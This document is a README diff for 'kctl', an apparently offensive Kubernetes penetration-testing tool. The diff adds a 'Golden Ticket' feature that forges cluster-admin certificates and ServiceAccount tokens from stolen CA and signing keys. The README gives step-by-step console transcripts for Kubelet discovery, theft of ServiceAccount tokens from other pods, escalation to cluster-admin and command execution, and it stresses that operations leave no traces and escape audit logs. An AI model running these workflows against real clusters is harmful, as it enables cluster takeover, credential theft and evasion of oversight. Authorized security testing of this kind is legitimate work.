@@ -25,13 +25,15 @@
   <br>
 </h1>
 
-<h4 align="center">Kubernetes Kubelet Security Audit Tool - Penetration Testing & Lateral Movement</h4>
+<h4 align="center">Kubernetes Security Audit Tool - Penetration Testing & Lateral Movement</h4>
 
 <p align="center">
   <a href="#features">Features</a> •
   <a href="#installation">Installation</a> •
   <a href="#quick-start">Quick Start</a> •
+  <a href="#modes">Modes</a> •
   <a href="#commands">Commands</a> •
+  <a href="#golden-ticket">Golden Ticket</a> •
   <a href="#attack-scenario">Attack Scenario</a> •
   <a href="#defense">Defense</a>
 </p>
@@ -40,28 +42,23 @@
 
 ## Overview
 
-**kctl** is a lightweight Kubernetes security audit tool specifically designed for Kubelet API security assessment and privilege analysis. Built for penetration testing scenarios, it supports automatic environment detection and lateral movement when running inside a Pod.
+**kctl** is a Kubernetes security audit tool designed for penetration testing. It supports two operation modes:
 
-### Key Features
+- **Kubelet Mode** - Direct Kubelet API (10250) access for node-level operations
+- **Kubernetes Mode** - API Server (6443) operations including Golden Ticket attacks
 
-- **Network Discovery** - Scan network ranges to discover Kubelet nodes
-- **SA Permission Analysis** - Scan all Pod ServiceAccount tokens and analyze permissions
-- **Risk Assessment** - Automatically identify high-risk permissions (cluster-admin, nodes/proxy, etc.)
-- **Lateral Movement** - Execute commands across Pods via Kubelet API
-- **Stealth Operation** - All data cached in memory, automatically cleared on exit
 
 ## Features
 
-| Feature | Description |
-|---------|-------------|
-| `discover` | Scan network ranges to find Kubelet endpoints |
-| `sa scan` | Extract and analyze SA tokens from all Pods |
-| `sa list` | List discovered ServiceAccounts with risk levels |
-| `exec` | Execute commands in any Pod via Kubelet API (WebSocket) |
-| `run` | Execute commands via /run API (simpler, no WebSocket) |
-| `portforward` | Port forwarding through Kubelet API (SPDY) |
-| `pid2pod` | Map Linux PIDs to Pod metadata (in-Pod only) |
-| `pods` | List all Pods on the node |
+| Feature | Mode | Description |
+|---------|------|-------------|
+| `discover` | Kubelet | Scan network ranges to find Kubelet endpoints |
+| `sa scan` | Kubelet | Extract and analyze SA tokens from all Pods |
+| `exec` | Kubelet | Execute commands in any Pod via Kubelet API |
+| `run` | Kubelet | Execute commands via /run API |
+| `portforward` | Kubelet | Port forwarding through Kubelet API |
+| `pid2pod` | Kubelet | Map Linux PIDs to Pod metadata |
+| `golden` | Kubernetes | Forge certificates and SA tokens (Golden Ticket) |
 
 ## Installation
 
@@ -122,11 +119,12 @@ $ ./kctl console
     ██╔═██╗ ██║        ██║   ██║
     ██║  ██╗╚██████╗   ██║   ███████╗
     ╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚══════╝
-                Kubelet Security Audit Tool
 
-  Mode        : In-Pod (Memory Database)
-  Kubelet     : 10.244.1.1:10250 (auto-detected)
-  Token       : /var/run/secrets/kubernetes.io/serviceaccount/token
+  Kubernetes Security Audit Tool
+
+  [*] Mode: kubelet (In-Pod)
+  [*] Kubelet: 10.244.1.1:10250 (auto-detected)
+  [*] Type 'help' for available commands
 
 [*] Auto-connecting to Kubelet 10.244.1.1:10250...
 ✓ Connected successfully
@@ -134,35 +132,181 @@ $ ./kctl console
 [*] Checking permissions...
 [+] Risk Level: CRITICAL
 
-kctl [default/attacker CRITICAL]>
+kctl [kubelet:10.244.1.1:10250 default/attacker CRITICAL]>
 ```
+
+## Modes
+
+kctl operates in two modes with different command sets:
+
+### Kubelet Mode (Default)
+
+For direct Kubelet API operations on a single node:
+
+```
+kctl [kubelet:10.0.0.1:10250]> help
+
+  Available Commands [kubelet]
+
+  Connection:
+    connect      Connect to Kubelet
+    discover     Scan network to find Kubelet nodes
+
+  Information:
+    pods         List Pods on the node
+    sa           ServiceAccount operations
+
+  Execution:
+    exec         Execute command (WebSocket)
+    run          Execute command (/run API)
+    portforward  Port forwarding
+    pid2pod      Map PIDs to Pods
+```
+
+### Kubernetes Mode
+
+For API Server operations including Golden Ticket attacks:
+
+```
+kctl [kubelet]> mode kubernetes
+[+] Switched to kubernetes mode
+
+kctl [kubernetes:127.0.0.1:6443]> help
+
+  Available Commands [kubernetes]
+
+  Golden Ticket:
+    golden       Forge certificates and SA tokens
+
+  Configuration:
+    set          Set configuration
+    show         Show information
+```
+
+Switch modes with `mode kubelet` or `mode kubernetes`.
+
+## Golden Ticket
+
+The Golden Ticket feature allows forging Kubernetes certificates and ServiceAccount tokens for persistence after compromising cluster CA keys.
+
+### Prerequisites
+
+To use Golden Ticket, you need access to:
+- **CA certificate and private key** (`ca.crt`, `ca.key`) - for forging user/node certificates
+- **SA signing key** (`sa.key`) - for forging ServiceAccount tokens
+
+These files are typically found on control plane nodes at `/etc/kubernetes/pki/`.
+
+### Forge User Certificate (cluster-admin)
+
+```bash
+# Switch to kubernetes mode
+kctl> mode kubernetes
+
+# Set API Server
+kctl [kubernetes]> set api-server 10.0.0.1
+kctl [kubernetes]> set api-port 6443
+
+# Forge admin certificate
+kctl [kubernetes:10.0.0.1:6443]> golden user-cert --ca-cert ca.crt --ca-key ca.key --role system:masters --user admin
+
+[*] Using API Server: https://10.0.0.1:6443
+[*] Creating user certificate (system:masters/admin)...
+
+[+] Successfully created user certificate!
+
+  Certificate: system-masters_admin.crt
+  Private key: system-masters_admin.key
+  Kubeconfig:  kubeconfig_system-masters_admin
+
+  Test with: kubectl --kubeconfig=kubeconfig_system-masters_admin auth whoami
+
+[*] Identity: admin (role: system:masters)
+[*] Expires at: 2027-02-10 16:30:19
+```
+
+### Forge ServiceAccount Token
+
+```bash
+# First, fetch UID cache from API Server
+kctl [kubernetes:10.0.0.1:6443]> golden update-uid --ca-cert ca.crt --ca-key ca.key
+
+[*] Using API Server: https://10.0.0.1:6443
+[*] Creating temporary admin certificate...
+[*] Requesting ServiceAccount list...
+
+[+] Received 45 ServiceAccounts
+[+] UID cache saved to memory
+
+# List cached UIDs
+kctl [kubernetes:10.0.0.1:6443]> golden uid-list
+kctl [kubernetes:10.0.0.1:6443]> golden uid-list -n kube-system
+
+# Forge token (UID auto-lookup from memory)
+kctl [kubernetes:10.0.0.1:6443]> golden sa-token --sa-key sa.key --namespace kube-system --name default
+
+[+] Found UID in memory cache: a1b2c3d4-...
+[*] Forging ServiceAccount token (TTL: 3600s)...
+
+[+] Forged ServiceAccount token for kube-system/default:
+
+  Token: eyJhbGciOiJSUzI1NiIs...
+
+[+] Kubeconfig: kubeconfig_kube-system_default
+```
+
+### Golden Ticket Subcommands
+
+| Command | Description |
+|---------|-------------|
+| `golden user-cert` | Forge user certificate (e.g., cluster-admin) |
+| `golden node-cert` | Forge node certificate (impersonate kubelet) |
+| `golden sa-token` | Forge ServiceAccount JWT token |
+| `golden update-uid` | Fetch SA UIDs from API Server to memory |
+| `golden uid-list` | List cached UIDs |
+| `golden test` | Validate key files |
 
 ## Commands
 
-### Console Commands
+### Common Commands (All Modes)
 
 | Command | Description |
 |---------|-------------|
 | `help` | Show help information |
+| `mode` | View or switch operation mode |
+| `set <key> <value>` | Set configuration |
+| `show options` | Show current configuration |
+| `show status` | Show session status |
+| `export json/csv` | Export scan results |
+| `clear` | Clear cache |
+| `exit` | Exit console |
+
+### Kubelet Mode Commands
+
+| Command | Description |
+|---------|-------------|
 | `discover <target>` | Scan network range for Kubelet nodes |
-| `connect [ip]` | Connect to Kubelet (optional, auto-connects) |
-| `sa` | ServiceAccount operations |
-| `sa list` | List scanned ServiceAccounts |
+| `connect [ip]` | Connect to Kubelet |
+| `pods` | List Pods on the node |
 | `sa scan` | Scan all Pod SA tokens |
+| `sa list` | List scanned ServiceAccounts |
 | `sa use <ns/name>` | Switch to specified SA |
 | `sa info` | Show current SA details |
-| `pods` | List Pods on the node |
 | `exec` | Execute command in Pod (WebSocket) |
 | `run` | Execute command in Pod (/run API) |
 | `portforward` | Port forwarding to Pod |
 | `pid2pod` | Map PIDs to Pods (in-Pod only) |
-| `set <key> <value>` | Set configuration |
-| `show options` | Show current configuration |
-| `show status` | Show session status |
-| `show kubelets` | Show discovered Kubelet nodes |
-| `export json/csv` | Export scan results |
-| `clear` | Clear cache |
-| `exit` | Exit console |
+
+### Kubernetes Mode Commands
+
+| Command | Description |
+|---------|-------------|
+| `golden user-cert` | Forge user certificate |
+| `golden node-cert` | Forge node certificate |
+| `golden sa-token` | Forge ServiceAccount token |
+| `golden update-uid` | Fetch SA UIDs to memory |
+| `golden uid-list` | List cached UIDs |
+| `golden test` | Validate key files |
 
 ### Network Discovery
 
@@ -268,29 +412,49 @@ pid2pod --pid 1234
 pid2pod --all
 ```
 
-### Typical Workflow
+### Typical Workflow (Kubelet Mode)
 
 ```bash
 # 1. Scan network to discover Kubelet nodes
-kctl [default]> discover 10.0.0.0/24
+kctl [kubelet]> discover 10.0.0.0/24
 
 # 2. Select target
-kctl [default]> set target 10.0.0.5
+kctl [kubelet]> set target 10.0.0.5
 
 # 3. Scan SA permissions on all Pods
-kctl [default]> sa scan
+kctl [kubelet:10.0.0.5:10250]> sa scan
 
 # 4. View high-privilege SAs
-kctl [default]> sa list --admin
+kctl [kubelet:10.0.0.5:10250]> sa list --admin
 
 # 5. Switch to high-privilege SA
-kctl [default]> sa use kube-system/cluster-admin
+kctl [kubelet:10.0.0.5:10250]> sa use kube-system/cluster-admin
 
-# 6. View new identity permissions
-kctl [kube-system/cluster-admin ADMIN]> sa info
+# 6. Execute commands with new identity
+kctl [kubelet:10.0.0.5:10250 kube-system/cluster-admin ADMIN]> exec -it
+```
 
-# 7. Execute commands with new identity
-kctl [kube-system/cluster-admin ADMIN]> exec -it
+### Typical Workflow (Golden Ticket)
+
+```bash
+# 1. Switch to kubernetes mode
+kctl [kubelet]> mode kubernetes
+
+# 2. Set API Server
+kctl [kubernetes]> set api-server 10.0.0.1
+kctl [kubernetes]> set api-port 6443
+
+# 3. Forge admin certificate (requires ca.crt and ca.key)
+kctl [kubernetes:10.0.0.1:6443]> golden user-cert -c ca.crt -k ca.key --role system:masters
+
+# 4. Test the forged certificate
+$ kubectl --kubeconfig=kubeconfig_system-masters_kubernetes-admin get nodes
+
+# 5. For SA token forgery, first fetch UIDs
+kctl [kubernetes:10.0.0.1:6443]> golden update-uid -c ca.crt -k ca.key
+
+# 6. Forge SA token (requires sa.key)
+kctl [kubernetes:10.0.0.1:6443]> golden sa-token -s sa.key --namespace kube-system --name default
 ```
 
 ## Attack Scenario
@@ -347,13 +511,13 @@ kubectl exec -it attacker -- /bin/sh
 [*] Checking permissions...
 [+] Risk Level: HIGH
 
-kctl [default/attacker HIGH]>
+kctl [kubelet:10.244.1.1:10250 default/attacker HIGH]>
 ```
 
 ##### Step 2: View Current Permissions
 
 ```
-kctl [default/attacker HIGH]> sa info
+kctl [kubelet:10.244.1.1:10250 default/attacker HIGH]> sa info
 
   ServiceAccount Information
   ─────────────────────────────────────────
@@ -371,7 +535,7 @@ kctl [default/attacker HIGH]> sa info
 ##### Step 3: Scan All Pods on the Node
 
 ```
-kctl [default/attacker HIGH]> sa scan
+kctl [kubelet:10.244.1.1:10250 default/attacker HIGH]> sa scan
 
 [*] Scanning ServiceAccount tokens...
 [*] Found 15 pods with SA tokens
@@ -392,7 +556,7 @@ HIGH     monitoring     prometheus-xxxxx       prometheus           Valid    -
 Since we have `nodes/proxy GET` permission, we can execute commands in any Pod via Kubelet API:
 
 ```
-kctl [default/attacker HIGH]> pods
+kctl [kubelet:10.244.1.1:10250 default/attacker HIGH]> pods
 
 NAMESPACE      POD                         STATUS    CONTAINERS
 ───────────────────────────────────────────────────────────────
@@ -404,7 +568,7 @@ default        nginx                       Running   nginx
 ```
 
 ```
-kctl [default/attacker HIGH]> exec -n kube-system kube-proxy-xxxxx -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
+kctl [kubelet:10.244.1.1:10250 default/attacker HIGH]> exec -n kube-system kube-proxy-xxxxx -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
 ```
 
 This returns the `kube-proxy` ServiceAccount token, which typically has cluster-admin privileges!
@@ -412,13 +576,13 @@ This returns the `kube-proxy` ServiceAccount token, which typically has cluster-
 ##### Step 5: Switch to High-Privilege Identity
 
 ```
-kctl [default/attacker HIGH]> sa use kube-system/kube-proxy
+kctl [kubelet:10.244.1.1:10250 default/attacker HIGH]> sa use kube-system/kube-proxy
 
 [+] Switched to kube-system/kube-proxy
 [*] Checking permissions...
 [!] Risk Level: ADMIN (cluster-admin)
 
-kctl [kube-system/kube-proxy ADMIN]>
+kctl [kubelet:10.244.1.1:10250 kube-system/kube-proxy ADMIN]>
 ```
 
 ##### Step 6: Full Cluster Control
@@ -496,10 +660,12 @@ done
 - Ensure you have proper authorization before use
 - All operations are performed in memory, leaving no traces after exit
 - Direct Kubelet API access is **not recorded** in Kubernetes audit logs
+- Golden Ticket attacks require prior access to cluster CA/SA keys
 
 ## References
 
 - [Kubernetes RCE Via Nodes/Proxy GET Permission](https://grahamhelton.com/blog/nodes-proxy-rce)
+- [k8s_spoofilizer - Kubernetes Golden Ticket](https://github.com/jtesta/k8s_spoofilizer)
 - [KEP-2862: Fine-Grained Kubelet API Authorization](https://github.com/kubernetes/enhancements/blob/master/keps/sig-node/2862-fine-grained-kubelet-authz/README.md)
 - [Kubelet Authentication/Authorization](https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/)
 
